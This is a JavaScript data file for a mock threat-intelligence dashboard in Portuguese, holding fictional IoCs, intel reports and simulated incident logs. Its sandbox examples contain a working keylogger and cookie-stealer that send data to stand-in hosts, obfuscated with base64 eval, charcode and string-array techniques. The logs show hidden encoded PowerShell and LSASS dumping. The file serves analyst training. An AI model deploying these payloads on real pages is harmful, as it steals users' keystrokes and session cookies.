/* ThreatEye – dados simulados (IoCs, relatórios e logs de incidente).
 * Tudo aqui é fictício. Endereços novos usam faixas reservadas para documentação
 * (192.0.2.x, 198.51.100.x, 203.0.113.x) e o TLD .test, para nunca apontar para um alvo real.
 */
(function (root) {
    "use strict";

    /* ---------- gerador determinístico (os mesmos dados a cada carga) ---------- */
    function rng(seed) {
        let a = seed >>> 0;
        return () => { a |= 0; a = (a + 0x6D2B79F5) | 0; let t = Math.imul(a ^ (a >>> 15), 1 | a); t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t; return ((t ^ (t >>> 14)) >>> 0) / 4294967296; };
    }
    const R = rng(20261122);
    const hex = n => Array.from({ length: n }, () => Math.floor(R() * 16).toString(16)).join("");
    const pick = a => a[Math.floor(R() * a.length)];

    const FAMILIAS = ["Cobalt Strike", "AsyncRAT", "Qakbot", "Emotet", "Formbook", "AgentTesla", "Loader JS", "Phishing kit", "Cryptominer", "Remcos"];
    const RISCO = ["Crítico", "Alto", "Médio", "Baixo"];
    const ORIGEM = ["Equipe SOC", "Feed Externo"];
    const M = 60000;

    const seed = [];
    const add = (valor, tipo, risco, origem, minAtras, familia, sub) =>
        seed.push({ id: "s" + seed.length, valor, tipo, sub: sub || null, risco, origem, ts: null, minAtras, familia });

    // âncoras: as mesmas linhas que já apareciam no site
    add("8f14e45fceea167a5a36dedd4bea2543", "Hash", "Crítico", "Equipe SOC", 60 * 2, "Loader JS", "MD5");
    add("185.220.101.42", "IP", "Alto", "Feed Externo", 60 * 4, "Nó de saída Tor");
    add("cdn-update-servico.test", "Domínio", "Médio", "Equipe SOC", 60 * 17, "Phishing kit");
    add("44d88612fea8a8f36de82e1278abb02f", "Hash", "Crítico", "Feed Externo", 60 * 40, "Qakbot", "MD5");
    add("194.38.29.142", "IP", "Crítico", "Equipe SOC", 60 * 6, "Cobalt Strike");
    add("login-secure.update.net", "Domínio", "Alto", "Equipe SOC", 60 * 9, "Phishing kit");
    add("cdn-telemetry.io", "Domínio", "Médio", "Feed Externo", 60 * 22, "Loader JS");

    const dominios = ["fatura-online", "docs-compartilhado", "mail-verifica", "suporte-conta", "nota-fiscal", "portal-seguro", "atualiza-agora", "boleto-2via", "cloud-sync", "rh-beneficios", "token-acesso", "vpn-corp"];
    const tlds = ["test", "test", "test", "top.test", "xyz.test"];
    dominios.forEach((d, i) => add(`${d}-${hex(3)}.${pick(tlds)}`, "Domínio", RISCO[Math.floor(R() * 3)], pick(ORIGEM), 60 * (10 + i * 9) + Math.floor(R() * 40), pick(FAMILIAS)));

    ["192.0.2.", "198.51.100.", "203.0.113."].forEach(p => { for (let i = 0; i < 4; i++) add(p + (10 + Math.floor(R() * 200)), "IP", RISCO[Math.floor(R() * 3)], pick(ORIGEM), 60 * (8 + Math.floor(R() * 160)), pick(FAMILIAS)); });

    for (let i = 0; i < 12; i++) {
        const len = pick([32, 40, 64]);
        add(hex(len), "Hash", RISCO[Math.floor(R() * 4)], pick(ORIGEM), 60 * (6 + Math.floor(R() * 220)), pick(FAMILIAS), len === 32 ? "MD5" : len === 40 ? "SHA-1" : "SHA-256");
    }

    const urls = ["/verify.php?id=", "/gate.php", "/panel/login", "/dl/inv.js", "/update.exe", "/collect"];
    for (let i = 0; i < 7; i++) add(`https://${pick(dominios)}-${hex(3)}.test${pick(urls)}${R() > .6 ? hex(6) : ""}`, "URL", RISCO[Math.floor(R() * 3)], pick(ORIGEM), 60 * (12 + Math.floor(R() * 150)), pick(FAMILIAS));

    // distribuição realista de risco para os itens gerados
    seed.forEach((s, i) => { if (i > 6 && i % 7 === 0) s.risco = "Crítico"; if (i > 6 && i % 11 === 0) s.risco = "Baixo"; });

    /* ---------- relatórios de inteligência ---------- */
    const relatorios = [
        { id: "REL-2026-089", titulo: "Phishing QR-Code", resumo: "Análise técnica de campanha de engenharia social direcionada ao setor financeiro utilizando redirecionamento dinâmico.", tlp: "TLP:AMBER", confianca: "Alta", mitre: "T1566", severidade: "Alta", situacao: "Publicado", autor: "M. Castro (L2)", nIocs: 4, minAtras: 60 * 30, origem: "seed" },
        { id: "REL-2026-090", titulo: "Infraestrutura C2", resumo: "Mapeamento de servidores de comando e controle associados a tráfego anômalo de saída na sub-rede corporativa.", tlp: "TLP:RED", confianca: "Moderada", mitre: "T1071", severidade: "Crítica", situacao: "Em revisão", autor: "J. Silva (L3)", nIocs: 7, minAtras: 60 * 12, origem: "seed" }
    ];

    /* ---------- exemplos para a sandbox (código ofuscado real, gerado por técnicas comuns) ---------- */
    const limpo = `var alvo = "https://portal-seguro-4a1.test/verify.php?id=8f14e45f";
var quadro = document.createElement("iframe");
quadro.src = alvo;
quadro.style.display = "none";
document.body.appendChild(quadro);
document.addEventListener("keydown", function (ev) {
  fetch("http://203.0.113.57/collect", { method: "POST", body: ev.key + document.cookie });
});`;
    const b64 = s => btoa(unescape(encodeURIComponent(s)));
    const exemplos = [
        { id: "base64", nome: "Base64 dentro de eval()", desc: "eval(atob(\"…\")): a carga inteira está em base64.", codigo: `// kit de phishing — loader enviado por e-mail (simulado)\neval(atob("${b64(limpo)}"));` },
        {
            id: "charcode", nome: "String.fromCharCode + hex", desc: "Texto montado a partir de números e escapes \\x.",
            codigo: `var _h = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x63\\x64\\x6e\\x2d\\x75\\x70\\x64\\x61\\x74\\x65\\x2d\\x73\\x65\\x72\\x76\\x69\\x63\\x6f\\x2e\\x74\\x65\\x73\\x74\\x2f\\x67\\x61\\x74\\x65";\nvar _p = String.fromCharCode(${[..."?token=44d88612fea8a8f36de82e1278abb02f"].map(c => c.charCodeAt(0)).join(", ")});\nwindow["location"]["href"] = _h + _p;`
        },
        {
            id: "strarray", nome: "Array de strings (_0x…)", desc: "Estilo obfuscator.io: strings guardadas num array rotacionado.",
            codigo: (() => {
                const strs = []; const body = `var _0xa=document["createElement"]("script");\n_0xa["src"]="https://cdn-telemetry.io/t.js?u="+encodeURIComponent(document["cookie"]);\ndocument["head"]["appendChild"](_0xa);\nnavigator["sendBeacon"]("http://198.51.100.23/b", document["cookie"]);`
                    .replace(/"((?:[^"\\]|\\.)*)"/g, (m, s) => { let i = strs.indexOf(s); if (i < 0) { i = strs.length; strs.push(s); } return `_0x4d2f('0x${i.toString(16)}')`; });
                const n = 0x1a3, k = n % strs.length, stored = strs.slice(strs.length - k).concat(strs.slice(0, strs.length - k));
                return `var _0x91c3=${JSON.stringify(stored)};(function(_0x1,_0x2){var _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(_0x91c3,0x1a3));var _0x4d2f=function(_0x5,_0x6){_0x5=_0x5-0x0;var _0x7=_0x91c3[_0x5];return _0x7;};\n` + body.replace(/\b_0xa\b/g, "_0x2e1b");
            })()
        }
    ];

    /* ---------- logs simulados de incidentes ---------- */
    const logs = {
        "INC-2026-104": {
            titulo: "Phishing por QR-Code → Cobalt Strike",
            resumo: "Fatura falsa leva a um JavaScript que instala beacon C2 e se espalha por SMB.",
            texto: [
                '2026-11-22T09:12:03Z mail-gw01 MAILGW delivered msg=4471 from=cobranca@fatura-online-9ac.test to=m.castro@corp.local subject="Fatura 4471 em aberto" attach=fatura.pdf',
                '{"ts":"2026-11-22T09:13:50Z","host":"WKS-FIN-07","src":"EDR","event":"file_open","user":"m.castro","file":"fatura.pdf","note":"QR-Code presente no PDF"}',
                '{"ts":"2026-11-22T09:14:40Z","host":"WKS-FIN-07","src":"PROXY","event":"http_get","user":"m.castro","url":"https://login-secure.update.net/qr?id=4471","verdict":"allowed"}',
                '2026-11-22 09:15:21 WKS-FIN-07 EDR file_write user=m.castro path="C:\\Users\\m.castro\\Downloads\\inv.js" sha256=8f14e45fceea167a5a36dedd4bea254300000000000000000000000000000000',
                '2026-11-22 09:16:11 WKS-FIN-07 EDR process_create user=m.castro parent=explorer.exe child=wscript.exe cmd="wscript.exe C:\\Users\\m.castro\\Downloads\\inv.js"',
                '2026-11-22 09:16:34 WKS-FIN-07 EDR process_create user=m.castro parent=wscript.exe child=powershell.exe cmd="powershell -nop -w hidden -enc SQBFAFgA..."',
                '{"ts":"2026-11-22T09:17:02Z","host":"WKS-FIN-07","src":"DNS","event":"dns_query","user":"m.castro","query":"cdn-update-servico.test","answer":"194.38.29.142"}',
                '2026-11-22 09:17:09 WKS-FIN-07 NET conn_out user=m.castro dst=194.38.29.142 port=443 bytes=2.1KB note="primeiro beacon"',
                '2026-11-22 09:21:45 WKS-FIN-07 EDR reg_set user=m.castro key="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" value="wscript inv.js"',
                '2026-11-22 09:22:10 WKS-FIN-07 EDR schtask_create user=m.castro name="OneDriveSync" cmd="powershell -w hidden -f %TEMP%\\u.ps1"',
                '{"ts":"2026-11-22T09:30:00Z","host":"WKS-FIN-07","src":"NET","event":"conn_out","user":"m.castro","dst":"194.38.29.142","port":443,"bytes":"1.8KB","note":"beacon periódico (60s)"}',
                '2026-11-22 09:44:03 WKS-FIN-07 EDR lsass_access user=m.castro proc=powershell.exe access=0x1410 note="leitura de memória do LSASS"',
                '2026-11-22 09:51:27 WKS-FIN-07 AUTH logon_success user=svc-backup type=network src=WKS-FIN-07 dst=SRV-FS-02',
                '2026-11-22 09:52:40 SRV-FS-02 NET smb_connect user=svc-backup src=WKS-FIN-07 share=ADMIN$ note="cópia de binário"',
                '{"ts":"2026-11-22T09:54:12Z","host":"SRV-FS-02","src":"EDR","event":"service_create","user":"svc-backup","name":"WinUpdSvc","image":"C:\\\\Windows\\\\Temp\\\\svc.exe"}',
                '2026-11-22 09:55:01 SRV-FS-02 NET conn_out user=svc-backup dst=194.38.29.142 port=443 bytes=2.4KB note="novo beacon no servidor de arquivos"',
                '2026-11-22 10:12:30 SRV-FS-02 EDR archive_create user=svc-backup path="C:\\Windows\\Temp\\fin_2026.zip" size=412MB',
                '{"ts":"2026-11-22T10:20:44Z","host":"SRV-FS-02","src":"NET","event":"conn_out","user":"svc-backup","dst":"194.38.29.142","port":443,"bytes":"412MB","note":"upload volumoso"}',
                '2026-11-22 10:42:18 SOC-SIEM ALERT rule=C2-Beacon severity=critical src=SRV-FS-02 dst=194.38.29.142',
                '2026-11-22 10:44:00 SOC-SIEM ACTION isolate host=SRV-FS-02 by=j.silva'
            ].join("\n")
        },
        "INC-2026-103": {
            titulo: "Força bruta na VPN → conta comprometida",
            resumo: "Tentativas de senha na VPN, acesso com conta válida e consulta a dados internos.",
            texto: [
                '2026-11-21T22:03:10Z vpn-gw01 AUTH logon_failed user=admin src=203.0.113.88 count=40 note="40 falhas em 5 min"',
                '2026-11-21T22:09:42Z vpn-gw01 AUTH logon_failed user=rh.admin src=203.0.113.88 count=55',
                '2026-11-21T22:14:05Z vpn-gw01 AUTH logon_success user=rh.admin src=203.0.113.88 note="senha fraca"',
                '{"ts":"2026-11-21T22:15:30Z","host":"VPN-GW01","src":"VPN","event":"session_start","user":"rh.admin","ip":"203.0.113.88","geo":"fora do país habitual"}',
                '2026-11-21T22:18:11Z SRV-HR-01 NET smb_connect user=rh.admin src=VPN-GW01 share=RH$ note="listagem de pastas"',
                '2026-11-21T22:26:50Z SRV-HR-01 EDR process_create user=rh.admin parent=cmd.exe child=whoami.exe cmd="whoami /all"',
                '2026-11-21T22:31:02Z SRV-HR-01 EDR lsass_access user=rh.admin proc=rundll32.exe note="comsvcs.dll MiniDump"',
                '{"ts":"2026-11-21T22:40:20Z","host":"SRV-HR-01","src":"NET","event":"conn_out","user":"rh.admin","dst":"198.51.100.77","port":443,"bytes":"96MB","note":"envio de planilhas"}',
                '2026-11-21T22:52:00Z SOC-SIEM ALERT rule=Impossible-Travel severity=high user=rh.admin',
                '2026-11-21T22:55:30Z SOC-SIEM ACTION disable-account user=rh.admin by=a.souza'
            ].join("\n")
        }
    };

    root.TEDados = { iocsSeed: seed, relatoriosSeed: relatorios, exemplos, logs, LIMPO: limpo };
})(typeof window !== "undefined" ? window : globalThis);
